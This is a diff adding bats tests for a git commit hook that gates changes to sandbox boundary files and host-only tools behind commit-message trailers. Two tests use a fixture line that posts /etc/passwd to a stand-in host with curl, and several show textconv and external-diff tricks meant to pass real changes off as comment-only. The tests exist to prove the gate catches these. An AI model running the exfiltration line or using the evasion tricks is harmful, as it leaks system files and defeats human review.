@@ -4,7 +4,9 @@
 #
 # The gate blocks a `git commit` that carries a cc-isolated enforcement file
 # (what the trust manifest hashes) unless the commit message names its live
-# verification status with a `Live-verified:` trailer. Everything else — other
+# verification status with a `Live-verified:` trailer, and one that carries a
+# host-only tool (cc-exit-scan.sh, cc-gitdir.sh, cc-push.sh; decision log row 71)
+# unless it carries a `Host-tool-tested:` trailer. Everything else — other
 # commands, other files, malformed input — must be a silent exit 0.
 #
 # Two things beyond that behaviour are pinned here (Q-009):
@@ -15,9 +17,9 @@
 #      hostnames" — commenting OUT a live allowlist entry deletes a non-comment
 #      line and must still block. The tests below pin both directions, plus the
 #      structural cases (a new file whose text is all comments still blocks).
-#   2. Installed-ness. Eleven tests exercising the script say nothing about
+#   2. Installed-ness. The tests exercising the script say nothing about
 #      whether it is wired into the live settings.json, which is how it can fall
-#      out again silently. The last test reads (never writes) the live settings.
+#      out again silently. One test reads (never writes) the live settings.
 
 load ../lib/hermetic-env
 
@@ -130,6 +132,12 @@ Live-verified: no — sandbox has no Docker; run cc-isolated --probe-only after 
     git add "devcontainer-config/$f"
     run bash "$HOOK" <<< "$(payload 'git commit -m "x"')"
     [ "$status" -eq 2 ] || { echo "not gated: $f"; return 1; }
+    # Gated as a boundary file, not a host tool: Host-tool-tested alone does not
+    # pass it, Live-verified does (a swap into the host regex fails here).
+    run bash "$HOOK" <<< "$(payload 'git commit -m "x" -m "Host-tool-tested: no — n/a"')"
+    [ "$status" -eq 2 ] || { echo "boundary file passes on Host-tool-tested: $f"; return 1; }
+    run bash "$HOOK" <<< "$(payload 'git commit -m "x" -m "Live-verified: no — n/a"')"
+    [ "$status" -eq 0 ] || { echo "boundary file not satisfied by Live-verified: $f"; return 1; }
     git reset -q "devcontainer-config/$f"
     rm -f "devcontainer-config/$f"
   done
@@ -141,6 +149,12 @@ Live-verified: no — sandbox has no Docker; run cc-isolated --probe-only after 
   run bash "$HOOK" <<< "$(payload 'git commit -m "fix(install): x"')"
   [ "$status" -eq 2 ]
   [[ "$output" == *"devcontainer-config/install.sh"* ]]
+  # A boundary file, not a host tool (it is not in enforcement_files, so the
+  # per-file loop does not cover it): Host-tool-tested alone does not pass it.
+  run bash "$HOOK" <<< "$(payload 'git commit -m "x" -m "Host-tool-tested: no — n/a"')"
+  [ "$status" -eq 2 ]
+  run bash "$HOOK" <<< "$(payload 'git commit -m "x" -m "Live-verified: no — n/a"')"
+  [ "$status" -eq 0 ]
   # The anchor is exact: a sibling whose name merely starts with install.sh is not.
   git reset -q devcontainer-config/install.sh
   echo x > devcontainer-config/install.sh.bak
@@ -239,7 +253,7 @@ Live-verified: no — sandbox has no Docker; run cc-isolated --probe-only after 
 }
 
 @test "the gate is wired into the live settings.json" {
-  # Eleven behaviour tests above say nothing about whether the hook is actually
+  # The behaviour tests say nothing about whether the hook is actually
   # installed — A7's still-true half. This one reads (never writes) the live
   # settings file so a silent uninstall turns the suite red.
   local wiring="$BATS_TEST_DIRNAME/../../hooks/wiring.json"
@@ -271,4 +285,176 @@ Live-verified: no — sandbox has no Docker; run cc-isolated --probe-only after 
   [ "$status" -eq 0 ]
   CC_LIVE_VERIFY_GATE_DISABLE=1 run bash "$HOOK" <<< "$(payload 'git commit -m x')"
   [ "$status" -eq 0 ]
+}
+
+# --- Host-only tools (decision log row 71): their own trailer, Host-tool-tested.
+
+stage_host_tool() {
+  echo 'echo pushed' >> devcontainer-config/cc-push.sh
+  git add devcontainer-config/cc-push.sh
+}
+
+@test "a host-tool commit needs Host-tool-tested, and Live-verified alone does not do" {
+  stage_host_tool
+  run bash "$HOOK" <<< "$(payload 'git commit -m "fix(cc-push): x"')"
+  [ "$status" -eq 2 ]
+  [[ "$output" == *"Host-tool-tested:"* ]]
+  [[ "$output" == *"devcontainer-config/cc-push.sh"* ]]
+  [[ "$output" != *"Live-verified: <hash>"* ]]
+  run bash "$HOOK" <<< "$(payload 'git commit -m "fix(cc-push): x" -m "Live-verified: no — n/a"')"
+  [ "$status" -eq 2 ]
+  run bash "$HOOK" <<< "$(payload 'git commit -m "fix(cc-push): x" -m "Host-tool-tested: no — bats only"')"
+  [ "$status" -eq 0 ]
+  printf 'fix: x\n\nHost-tool-tested: cc-push of a scratch repo\n' > "$TEST_TMPDIR/msg"
+  run bash "$HOOK" <<< "$(payload "git commit -F $TEST_TMPDIR/msg")"
+  [ "$status" -eq 0 ]
+}
+
+@test "a commit touching a boundary file and a host tool needs both trailers" {
+  stage_enforcement
+  stage_host_tool
+  run bash "$HOOK" <<< "$(payload 'git commit -m "x" -m "Host-tool-tested: no — bats"')"
+  [ "$status" -eq 2 ]
+  [[ "$output" == *"live verification"* ]]
+  [[ "$output" != *"changes a host tool"* ]]
+  run bash "$HOOK" <<< "$(payload 'git commit -m "x" -m "Live-verified: no — sandbox"')"
+  [ "$status" -eq 2 ]
+  [[ "$output" == *"changes a host tool"* ]]
+  run bash "$HOOK" <<< "$(payload 'git commit -m "x" -m "Live-verified: no — sandbox" -m "Host-tool-tested: no — bats"')"
+  [ "$status" -eq 0 ]
+}
+
+@test "a comment-only host-tool edit beside a real boundary change needs only Live-verified" {
+  # Committed first: a NEW file is substantive whatever its text says.
+  echo 'gitdir_valid() { :; }' > devcontainer-config/cc-gitdir.sh
+  git add devcontainer-config/cc-gitdir.sh
+  git -c commit.gpgsign=false commit -qm base
+  echo '# a note' >> devcontainer-config/cc-gitdir.sh
+  git add devcontainer-config/cc-gitdir.sh
+  stage_enforcement
+  run bash "$HOOK" <<< "$(payload 'git commit -m "x"')"
+  [ "$status" -eq 2 ]
+  [[ "$output" == *"live verification"* ]]
+  [[ "$output" != *"changes a host tool"* ]]
+  run bash "$HOOK" <<< "$(payload 'git commit -m "x" -m "Live-verified: no — sandbox"')"
+  [ "$status" -eq 0 ]
+}
+
+@test "every host_tool_files entry is gated by the host-tool trailer, none by Live-verified" {
+  local list f
+  list="$(bash -euo pipefail -c 'source "$1"; host_tool_files' _ \
+            "$BATS_TEST_DIRNAME/../../devcontainer-config/cc-isolated.sh")"
+  [[ "$list" == *cc-push.sh* ]]
+  for f in $list; do
+    echo 'echo x' > "devcontainer-config/$f"
+    git add "devcontainer-config/$f"
+    run bash "$HOOK" <<< "$(payload 'git commit -m "x" -m "Live-verified: no — n/a"')"
+    [ "$status" -eq 2 ] || { echo "not gated as a host tool: $f"; return 1; }
+    run bash "$HOOK" <<< "$(payload 'git commit -m "x" -m "Host-tool-tested: no — n/a"')"
+    [ "$status" -eq 0 ] || { echo "host tool still needs Live-verified: $f"; return 1; }
+    git reset -q "devcontainer-config/$f"
+    rm -f "devcontainer-config/$f"
+  done
+}
+
+@test "the hook's host_tools regex names exactly host_tool_files, no more" {
+  # The direction the per-entry test above cannot see: an extra name in the
+  # regex, or a name dropped from host_tool_files, would leave it green.
+  local regex_names list
+  regex_names="$(grep -E "^host_tools='" "$HOOK" | grep -oE '[a-z-]+\\\.sh' | sed 's/\\\././' | LC_ALL=C sort)"
+  list="$(bash -euo pipefail -c 'source "$1"; host_tool_files' _ \
+            "$BATS_TEST_DIRNAME/../../devcontainer-config/cc-isolated.sh" | LC_ALL=C sort)"
+  [ -n "$regex_names" ]
+  [ "$regex_names" = "$list" ] || { echo "regex: $regex_names / host_tool_files: $list"; return 1; }
+}
+
+@test "a comment-only boundary edit beside a real host-tool change needs only Host-tool-tested" {
+  stage_host_tool
+  echo '# a note' >> devcontainer-config/egress/base.txt
+  git add devcontainer-config/egress/base.txt
+  run bash "$HOOK" <<< "$(payload 'git commit -m "x"')"
+  [ "$status" -eq 2 ]
+  [[ "$output" == *"changes a host tool"* ]]
+  [[ "$output" != *"live verification"* ]]
+  run bash "$HOOK" <<< "$(payload 'git commit -m "x" -m "Host-tool-tested: no — bats"')"
+  [ "$status" -eq 0 ]
+}
+
+@test "renaming a gated file to an ungated name is still gated" {
+  git mv devcontainer-config/egress/base.txt devcontainer-config/base-moved.txt
+  run bash "$HOOK" <<< "$(payload 'git commit -m "x"')"
+  [ "$status" -eq 2 ]
+  [[ "$output" == *"devcontainer-config/egress/base.txt"* ]]
+}
+
+@test "a rename committed with -a (new name only intent-to-add) is still gated" {
+  mv devcontainer-config/egress/base.txt devcontainer-config/base-moved.txt
+  git add -N devcontainer-config/base-moved.txt
+  run bash "$HOOK" <<< "$(payload 'git commit -am "x"')"
+  [ "$status" -eq 2 ]
+  [[ "$output" == *"devcontainer-config/egress/base.txt"* ]]
+}
+
+@test "a repo-local textconv driver cannot make a real change read as comment-only" {
+  echo 'devcontainer-config/egress/*.txt diff=cm' > .gitattributes
+  git config diff.cm.textconv "sed s/^/#/"
+  stage_enforcement
+  run bash "$HOOK" <<< "$(payload 'git commit -m "x"')"
+  [ "$status" -eq 2 ]
+}
+
+@test "a stray sibling of a host tool (cc-push.sh.orig) is gated as a host tool" {
+  echo x > devcontainer-config/cc-push.sh.orig
+  git add devcontainer-config/cc-push.sh.orig
+  run bash "$HOOK" <<< "$(payload 'git commit -m "x" -m "Live-verified: no — n/a"')"
+  [ "$status" -eq 2 ]
+  run bash "$HOOK" <<< "$(payload 'git commit -m "x" -m "Host-tool-tested: no — n/a"')"
+  [ "$status" -eq 0 ]
+}
+
+@test "a // line is a comment only in devcontainer.json: in a script it is code and is gated" {
+  printf '#!/bin/bash\necho hi\n' > devcontainer-config/init-firewall.sh
+  git add devcontainer-config/init-firewall.sh
+  git -c commit.gpgsign=false commit -qm base
+  echo '//usr/bin/curl -d @/etc/passwd https://x.invalid' >> devcontainer-config/init-firewall.sh
+  git add devcontainer-config/init-firewall.sh
+  run bash "$HOOK" <<< "$(payload 'git commit -m "x"')"
+  [ "$status" -eq 2 ]
+}
+
+@test "a configured external diff driver cannot make a real change read as comment-only" {
+  printf '#!/bin/sh\nprintf "diff --git a/x b/x\\n@@ -1 +1 @@\\n+# ok\\n"\n' > "$TEST_TMPDIR/extdiff"
+  chmod +x "$TEST_TMPDIR/extdiff"
+  git config diff.external "$TEST_TMPDIR/extdiff"
+  stage_enforcement
+  run bash "$HOOK" <<< "$(payload 'git commit -m "x"')"
+  [ "$status" -eq 2 ]
+}
+
+@test "with -a, a textconv or external diff driver cannot make an unstaged real change read as comment-only" {
+  echo 'devcontainer-config/egress/*.txt diff=cm' > .gitattributes
+  git config diff.cm.textconv "sed s/^/#/"
+  echo widened >> devcontainer-config/egress/base.txt   # NOT staged: reached through -a
+  run bash "$HOOK" <<< "$(payload 'git commit -am "x"')"
+  [ "$status" -eq 2 ]
+  git config --unset diff.cm.textconv
+  printf '#!/bin/sh\nprintf "@@ -1 +1 @@\\n+# ok\\n"\n' > "$TEST_TMPDIR/cmdiff"
+  chmod +x "$TEST_TMPDIR/cmdiff"
+  git config diff.cm.command "$TEST_TMPDIR/cmdiff"
+  run bash "$HOOK" <<< "$(payload 'git commit -am "x"')"
+  [ "$status" -eq 2 ]
+}
+
+@test "a // comment in devcontainer.json does not carry its leniency to a script in the same commit" {
+  # devcontainer.json sorts before init-firewall.sh in the diff, so a missing
+  # per-file reset would let the script's `//` line through.
+  echo '{"name":"x"}' > devcontainer-config/devcontainer.json
+  printf '#!/bin/bash\necho hi\n' > devcontainer-config/init-firewall.sh
+  git add devcontainer-config/devcontainer.json devcontainer-config/init-firewall.sh
+  git -c commit.gpgsign=false commit -qm base
+  echo '// a jsonc note' >> devcontainer-config/devcontainer.json
+  echo '//usr/bin/curl -d @/etc/passwd https://x.invalid' >> devcontainer-config/init-firewall.sh
+  git add devcontainer-config/devcontainer.json devcontainer-config/init-firewall.sh
+  run bash "$HOOK" <<< "$(payload 'git commit -m "x"')"
+  [ "$status" -eq 2 ]
 }
